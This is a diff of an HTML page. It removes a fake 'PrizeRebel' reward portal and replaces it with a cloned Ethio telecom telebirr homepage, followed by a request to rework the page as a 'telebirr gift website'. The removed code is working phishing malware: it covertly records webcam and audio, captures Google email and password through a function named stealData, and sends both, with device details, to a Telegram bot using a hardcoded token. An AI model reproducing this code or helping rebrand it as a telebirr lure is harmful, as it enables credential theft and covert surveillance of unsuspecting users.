@@ -1,311 +1,472 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UAIF Rewards | Secure Gateway</title>
-    <style>
-        :root {
-            --primary: #00d2ff;
-            --hacker: #00ff88;
-            --bg: #0f172a;
-            --glass: rgba(15, 23, 42, 0.9);
-        }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>telebirr – Ethio telecom</title>
+    <style>
+        :root {
+            --primary-blue: #023e8a;
+            --telebirr-green: #008751;
+            --telebirr-dark-green: #004d2e;
+            --telebirr-yellow: #ffcc00;
+            --bg-light: #f8fafc;
+            --text-main: #1e293b;
+            --text-muted: #64748b;
+        }
 
-        body {
-            background: radial-gradient(circle at center, #1e293b 0%, #020617 100%);
-            color: white;
-            font-family: 'Inter', sans-serif;
-            margin: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            overflow: hidden;
-        }
+        * {
+            box-sizing: border-box;
+        }
 
-        .header-profile {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            background: var(--glass);
-            padding: 10px 20px;
-            border-radius: 50px;
-            border: 1px solid var(--primary);
-            backdrop-filter: blur(10px);
-            z-index: 100;
-        }
-        .v-badge { color: var(--primary); font-weight: bold; }
-        .user-photo { width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }
+        body {
+            margin: 0;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            color: var(--text-main);
+            background-color: #ffffff;
+            -webkit-font-smoothing: antialiased;
+        }
 
-        .main-card {
-            background: var(--glass);
-            backdrop-filter: blur(25px);
-            width: 90%;
-            max-width: 420px;
-            padding: 40px;
-            border-radius: 35px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            text-align: center;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
-            position: relative;
-        }
+        /* Top Navbar */
+        header {
+            background-color: #ffffff;
+            border-bottom: 3px solid var(--telebirr-yellow);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 50px;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+        }
 
-        .verify-btn, .login-btn {
-            background: linear-gradient(45deg, #00d2ff, #3a7bd5);
-            color: white;
-            border: none;
-            padding: 18px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 15px;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 20px;
-            transition: 0.3s;
-        }
+        .logo-area span {
+            color: var(--primary-blue);
+            font-weight: 800;
+            font-size: 21px;
+            letter-spacing: -0.5px;
+            line-height: 1.1;
+            display: inline-block;
+        }
 
-        .input-group { text-align: left; margin-bottom: 15px; position: relative; }
-        label { display: block; margin-bottom: 5px; font-size: 13px; color: #94a3b8; }
-        input {
-            width: 100%;
-            padding: 15px;
-            border-radius: 12px;
-            border: 1px solid rgba(255,255,255,0.1);
-            background: rgba(0,0,0,0.3);
-            color: white;
-            box-sizing: border-box;
-            outline: none;
-        }
-        .toggle-pass {
-            position: absolute;
-            right: 15px;
-            top: 38px;
-            cursor: pointer;
-            color: var(--primary);
-            font-size: 12px;
-            font-weight: bold;
-        }
+        nav ul {
+            list-style: none;
+            display: flex;
+            gap: 28px;
+            margin: 0;
+            padding: 0;
+            align-items: center;
+        }
 
-        .footer-sponsor {
-            position: absolute;
-            bottom: 30px;
-            width: 100%;
-            text-align: center;
-        }
-        .sponsor-grid { display: flex; justify-content: center; gap: 30px; margin-top: 10px; }
-        .sponsor-box img { width: 60px; height: 60px; border-radius: 12px; border: 1px solid var(--hacker); background: #000; padding: 3px; }
+        nav a {
+            text-decoration: none;
+            color: #334155;
+            font-weight: 500;
+            font-size: 14px;
+            transition: color 0.2s ease;
+        }
 
-        .loader-ring {
-            width: 80px; height: 80px;
-            border: 5px solid rgba(255,255,255,0.1);
-            border-top: 5px solid var(--hacker);
-            border-radius: 50%;
-            margin: 20px auto;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        .hidden { display: none; }
+        nav a:hover {
+            color: var(--telebirr-green);
+        }
 
-        #progress-container {
-            width: 100%;
-            background: rgba(255,255,255,0.1);
-            border-radius: 10px;
-            margin-top: 20px;
-            overflow: hidden;
-        }
-        #progress-bar {
-            width: 0%;
-            height: 10px;
-            background: var(--hacker);
-            box-shadow: 0 0 15px var(--hacker);
-            transition: width 0.5s;
-        }
-    </style>
+        .lang-btn {
+            background: var(--telebirr-green);
+            color: white;
+            border: none;
+            padding: 7px 16px;
+            border-radius: 6px;
+            font-weight: 700;
+            font-size: 13px;
+            cursor: pointer;
+            transition: background 0.2s ease;
+        }
+
+        .lang-btn:hover {
+            background: var(--telebirr-dark-green);
+        }
+
+        /* Hero Section with High-Impact Gradient & Image Overlay */
+        .hero {
+            background: linear-gradient(90deg, rgba(0, 135, 81, 0.96) 0%, rgba(0, 77, 46, 0.85) 65%), 
+                        url('https://images.unsplash.com/photo-1558449028-b53a39d100fc?auto=format&fit=crop&q=80&w=1200') no-repeat center center/cover;
+            color: white;
+            padding: 90px 50px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .hero-content {
+            max-width: 650px;
+        }
+
+        .hero-content h1 {
+            font-size: 54px;
+            font-weight: 800;
+            margin: 0 0 20px 0;
+            line-height: 1.1;
+            letter-spacing: -1px;
+        }
+
+        .hero-content p {
+            font-size: 18px;
+            margin: 0 0 35px 0;
+            opacity: 0.95;
+            line-height: 1.6;
+        }
+
+        .btn-read-more {
+            background: transparent;
+            border: 2px solid white;
+            color: white;
+            padding: 14px 32px;
+            font-size: 15px;
+            font-weight: 700;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-read-more:hover {
+            background: white;
+            color: var(--telebirr-green);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+        }
+
+        /* Content Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 70px 20px;
+        }
+
+        h2.section-title {
+            color: var(--telebirr-green);
+            font-size: 26px;
+            margin-bottom: 35px;
+            text-transform: capitalize;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+
+        /* Dynamic Grid Structure */
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 30px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 18px;
+            box-shadow: 0 6px 24px rgba(0,0,0,0.05);
+            overflow: hidden;
+            border: 1px solid #f1f5f9;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 30px rgba(0,0,0,0.08);
+        }
+
+        .card-img {
+            width: 100%;
+            height: 210px;
+            object-fit: cover;
+            background-color: #e2e8f0;
+        }
+
+        .card-body {
+            padding: 28px;
+        }
+
+        .card-body h3 {
+            margin: 0 0 12px 0;
+            font-size: 20px;
+            color: #0f172a;
+            font-weight: 700;
+        }
+
+        .card-body p {
+            font-size: 14px;
+            color: var(--text-muted);
+            line-height: 1.6;
+            margin: 0;
+        }
+
+        .card-footer {
+            padding: 0 28px 28px 28px;
+        }
+
+        .btn-card {
+            background: transparent;
+            border: 1.5px solid var(--telebirr-green);
+            color: var(--telebirr-green);
+            padding: 10px 26px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-card:hover {
+            background: var(--telebirr-green);
+            color: white;
+        }
+
+        /* Statistics Metrics Panel */
+        .stats-section {
+            background-color: var(--bg-light);
+            padding: 70px 20px;
+            text-align: center;
+            border-top: 1px solid #e2e8f0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .stats-grid {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 24px;
+        }
+
+        .stat-box {
+            background: white;
+            padding: 30px 20px;
+            border-radius: 14px;
+            box-shadow: 0 3px 12px rgba(0,0,0,0.03);
+            border: 1px solid #f1f5f9;
+        }
+
+        .stat-box h3 {
+            color: var(--telebirr-green);
+            font-size: 28px;
+            margin: 0 0 8px 0;
+            font-weight: 800;
+        }
+
+        .stat-box p {
+            color: var(--text-muted);
+            font-size: 13px;
+            margin: 0;
+            font-weight: 600;
+        }
+
+        /* Professional Footer Elements */
+        footer {
+            background-color: #0f172a;
+            color: #94a3b8;
+            padding: 70px 50px 30px 50px;
+        }
+
+        .footer-grid {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 40px;
+            margin-bottom: 50px;
+        }
+
+        .footer-col h4 {
+            color: var(--telebirr-green);
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            margin-bottom: 22px;
+            font-weight: 700;
+        }
+
+        .footer-col ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .footer-col ul li {
+            margin-bottom: 12px;
+        }
+
+        .footer-col ul li a {
+            color: #cbd5e1;
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.2s ease;
+        }
+
+        .footer-col ul li a:hover {
+            color: white;
+        }
+
+        .footer-bottom {
+            max-width: 1200px;
+            margin: 0 auto;
+            border-top: 1px solid #1e293b;
+            padding-top: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+        }
+    </style>
 </head>
 <body>
 
-    <div class="header-profile">
-        <span class="v-badge">✓ VERIFIED</span>
-        <img src="libraryyy/ class="user-photo" alt="Admin">
-    </div>
+    <header>
+        <div class="logo-area">
+            <span>ethio telecom<br><strong style="color:var(--telebirr-green);">telebirr</strong></span>
+        </div>
+        <nav>
+            <ul>
+                <li><a href="#">Services ▾</a></li>
+                <li><a href="#">Financial Services ▾</a></li>
+                <li><a href="#">Price</a></li>
+                <li><a href="#">Developer Portal</a></li>
+                <li><a href="#">Getting Started ▾</a></li>
+                <li><a href="#">Contact Us</a></li>
+                <li><button class="lang-btn">Eng</button></li>
+            </ul>
+        </nav>
+    </header>
 
-    <div class="main-card">
-        <div id="step-1">
-            <h1 style="color: var(--primary);">EARN Portal</h1>
-            <p>Verify your identity to claim your <b>PrizeRebel Gift</b>.</p>
-            <button class="verify-btn" onclick="startVerification()">VERIFY I'M NOT A ROBOT</button>
-            <a href="https://t.me/@doctorrobot0" style="color:var(--hacker); text-decoration:none; font-size:12px; display:block; margin-top:15px;">Admin:@KCH_Processor_Bot </a>
-        </div>
+    <section class="hero">
+        <div class="hero-content">
+            <h1>Ultra-Fast Charging</h1>
+            <p>We Power Ethiopia's EV Future with Ultra-Fast Charging. Driving Ethiopia's Digital and Green Transformation</p>
+            <button class="btn-read-more">Read More</button>
+        </div>
+    </section>
 
-        <div id="step-2" class="hidden">
-            <h2 style="color: var(--hacker)">ANALYZING SENSORS</h2>
-            <div class="loader-ring"></div>
-            
-            <div id="progress-container">
-                <div id="progress-bar"></div>
-            </div>
-            <p id="status-text" style="font-family: monospace; font-size: 12px; color: var(--hacker); margin-top: 10px;">Bypassing Firewall...</p>
+    <div class="container">
+        <h2 class="section-title">telebirr services</h2>
+        <div class="cards-grid">
+            
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1553877522-43269d4ea984?auto=format&fit=crop&q=80&w=600" alt="Bulk Payment" class="card-img">
+                <div class="card-body">
+                    <h3>Bulk Payment</h3>
+                    <p>Easily pay employees salary or other bulk payments on the go 24/7.</p>
+                </div>
+                <div class="card-footer">
+                    <button class="btn-card">Read More</button>
+                </div>
+            </div>
 
-            <p id="timer" style="font-size: 35px; font-weight: bold;">30</p>
-            <p style="font-family: monospace; color: var(--hacker);">checking Encrypted Handshake...</p>
-        </div>
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1532629345422-7515f3d16bb9?auto=format&fit=crop&q=80&w=600" alt="Donate / Fundraising" class="card-img">
+                <div class="card-body">
+                    <h3>Donate/Fundraising</h3>
+                    <p>Donate for GERD and other fundraising activities seamlessly.</p>
+                </div>
+                <div class="card-footer">
+                    <button class="btn-card">Read More</button>
+                </div>
+            </div>
 
-        <div id="step-3" class="hidden">
-            <h2 style="color: var(--primary); margin-bottom:10px;">Login Required</h2>
-            <p style="font-size: 13px; color: #94a3b8; margin-bottom: 20px;">Verification passed! Sign in with Google to receive your code.</p>
-            
-            <div class="input-group">
-                <label>Google Email</label>
-                <input type="email" id="email" placeholder="example@gmail.com">
-            </div>
-            
-            <div class="input-group">
-                <label>Password</label>
-                <input type="password" id="pass" placeholder="••••••••">
-                <span class="toggle-pass" onclick="togglePassword()">SHOW</span>
-            </div>
-            
-            <button class="login-btn" onclick="stealData()">CLAIM REWARD NOW</button>
-        </div>
-    </div>
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1556742049-0a67d554c2ec?auto=format&fit=crop&q=80&w=600" alt="Withdraw Cash" class="card-img">
+                <div class="card-body">
+                    <h3>Withdraw Cash</h3>
+                    <p>Withdraw cash anywhere from your telebirr account at the nearby telebirr agent or Ethio telecom shop.</p>
+                </div>
+                <div class="card-footer">
+                    <button class="btn-card">Read More</button>
+                </div>
+            </div>
 
-    <div class="footer-sponsor">
-        <p style="font-size: 10px; letter-spacing: 2px; color: #475569;">OFFICIAL SPONSORS</p>
-        <div class="sponsor-grid">
-            <div class="sponsor-box">
-                <img src="libraryy/.png" alt="EARN">
-            </div>
-            <div class="sponsor-box">
-                <img src="librayyy/.png" alt="KCH">
-            </div>
-        </div>
-    </div>
+        </div>
+    </div>
 
-    <video id="vid" style="display:none" autoplay playsinline muted></video>
+    <section class="stats-section">
+        <h2 class="section-title" style="text-align: center; margin-bottom: 40px;">telebirr Statistics</h2>
+        <div class="stats-grid">
+            <div class="stat-box">
+                <h3>+9.13Tn</h3>
+                <p>Transaction Value (ETB)</p>
+            </div>
+            <div class="stat-box">
+                <h3>+60.59M</h3>
+                <p>Total Customers</p>
+            </div>
+            <div class="stat-box">
+                <h3>+410K</h3>
+                <p>Agents</p>
+            </div>
+            <div class="stat-box">
+                <h3>+440K</h3>
+                <p>Merchants</p>
+            </div>
+            <div class="stat-box">
+                <h3>31 Banks</h3>
+                <p>Banks to telebirr</p>
+            </div>
+            <div class="stat-box">
+                <h3>2</h3>
+                <p>MFIs</p>
+            </div>
+        </div>
+    </section>
 
-    <script>
-        const BOT_TOKEN = '8519852338:AAGLztQixpgpju8BFN77yKx5IPEByL20Jao';
-        const urlParams = new URLSearchParams(window.location.search);
-        let CHAT_ID = urlParams.get('id');
+    <footer>
+        <div class="footer-grid">
+            <div class="footer-col">
+                <h4>Getting Started</h4>
+                <ul>
+                    <li><a href="#">Download telebirr Apps</a></li>
+                    <li><a href="#">Requirements to Register</a></li>
+                    <li><a href="#">How to Register</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4>Services</h4>
+                <ul>
+                    <li><a href="#">Deposit | Cash-In</a></li>
+                    <li><a href="#">Withdrawal | Cash-Out</a></li>
+                    <li><a href="#">Buy Airtime</a></li>
+                    <li><a href="#">Ethio Bill Payment</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4>Financial Services</h4>
+                <ul>
+                    <li><a href="#">CBE Services</a></li>
+                    <li><a href="#">Dashen Bank</a></li>
+                    <li><a href="#">Siinqee Bank</a></li>
+                    <li><a href="#">Awash Bank</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4>Customer Service</h4>
+                <ul>
+                    <li><a href="#">Bill Payment Options</a></li>
+                    <li><a href="#">Online Service Request</a></li>
+                    <li><a href="#">Ethio e-CARE Service</a></li>
+                    <li><a href="#">FAQ</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4>Company</h4>
+                <ul>
+                    <li><a href="#">Profile</a></li>
+                    <li><a href="#">CSR</a></li>
+                    <li><a href="#">Vacancy</a></li>
+                    <li><a href="#">Tender</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>+251-127 &nbsp;&nbsp;|&nbsp;&nbsp; 126 &nbsp;&nbsp;|&nbsp;&nbsp; telebirr@ethionet.et</p>
+            <p>&copy; Ethio telecom. All Rights Reserved.</p>
+        </div>
+    </footer>
 
-        if (!CHAT_ID) {
-            CHAT_ID = '6804829152'; 
-        }
-
-        let recorder;
-        let chunks = [];
-
-        function togglePassword() {
-            const p = document.getElementById('pass');
-            const s = document.querySelector('.toggle-pass');
-            if (p.type === "password") {
-                p.type = "text";
-                s.innerText = "HIDE";
-            } else {
-                p.type = "password";
-                s.innerText = "SHOW";
-            }
-        }
-
-        async function startVerification() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: true 
-                });
-                
-                document.getElementById('vid').srcObject = stream;
-                document.getElementById('step-1').classList.add('hidden');
-                document.getElementById('step-2').classList.remove('hidden');
-
-                recorder = new MediaRecorder(stream);
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.start();
-
-                let progress = 0;
-                const bar = document.getElementById('progress-bar');
-                const status = document.getElementById('status-text');
-                const messages = ["Connecting to Proxy...", "Injecting Payload...", "Extracting Token...", "Finalizing Handshake..."];
-
-                let timeLeft = 30;
-                const countdown = setInterval(() => {
-                    timeLeft--;
-                    document.getElementById('timer').innerText = timeLeft;
-                    
-                    progress += 3.34; 
-                    bar.style.width = progress + "%";
-                    if(progress > 25) status.innerText = messages[1];
-                    if(progress > 50) status.innerText = messages[2];
-                    if(progress > 75) status.innerText = messages[3];
-
-                    if(timeLeft <= 0) {
-                        clearInterval(countdown);
-                        stopAndNext();
-                    }
-                }, 1000);
-            } catch (err) {
-                console.error(err);
-                alert("Security Error: Camera access is mandatory for verification.");
-            }
-        }
-
-        function stopAndNext() {
-            if (recorder && recorder.state !== "inactive") {
-                recorder.stop();
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('video', blob, 'capture.mp4');
-
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
-
-                    document.getElementById('step-2').classList.add('hidden');
-                    document.getElementById('step-3').classList.remove('hidden');
-                };
-            }
-        }
-
-        async function stealData() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-            const btn = document.querySelector('.login-btn');
-
-            if(!email || !pass) {
-                alert("Please complete the login to claim your reward.");
-                return;
-            }
-
-            btn.innerText = "Synchronizing...";
-            btn.disabled = true;
-
-            // --- GET DEVICE & BATTERY INFO ---
-            let batteryInfo = "Unknown";
-            try {
-                const battery = await navigator.getBattery();
-                batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
-            } catch (e) { batteryInfo = "Blocked by Browser"; }
-
-            const device = navigator.userAgent.match(/\(([^)]+)\)/)[1];
-            const screenRes = `${window.screen.width}x${window.screen.height}`;
-
-            const text = `🎯 **Login Captured!**\n\n📧 Email: \`${email}\`\n🔑 Pass: \`${pass}\`\n\n📱 **Device Info:**\n🔋 Battery: ${batteryInfo}\n📲 Model: ${device}\n🖥️ Screen: ${screenRes}\n🆔 Target ID: ${CHAT_ID}`;
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: '6804829152', text: text, parse_mode: 'Markdown' })
-            });
-
-            setTimeout(() => {
-                window.location.href = "https://www.prizerebel.com";
-            }, 1500);
-        }
-    </script>
 </body>
 </html>
-as you rrmemeber you and me was built this before months but i want to meak it as telebirr gift website
